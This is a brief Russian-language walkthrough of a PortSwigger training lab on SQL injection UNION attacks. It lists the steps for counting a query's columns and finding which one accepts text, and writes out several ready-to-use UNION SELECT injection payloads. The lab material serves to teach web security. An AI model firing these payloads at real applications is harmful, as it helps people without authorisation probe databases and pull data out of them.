# SQL injection UNION attack, finding a column containing text
## Цель: выполнить атаку SQL-инъекции UNION, которая вернет дополнительную строку, содержащую предоставленное значение

### Пути решения:
1. Так же как и  в предыдущей лабе сначало узнаем кол-во столбцов,  возвращаемых запросом
2. После того как определили, у меня это - ```'UNION SELECT NULL,NUll,NULL--```
3. Далее определяем столбец совместимый со строковыми данными, например если запрос возвращает 4 столбца то делаем так:
``` 
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
4. У меня их 3 значит я делаю  так:
```
'UNION SELECT 'ayDqsY',NUll,NULL--
'UNION SELECT NULL,'ayDqsY',NULL--   <----- Этот подошел
'UNION SELECT NULL,NUll,'ayDqsY'--
```

Ссылка: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
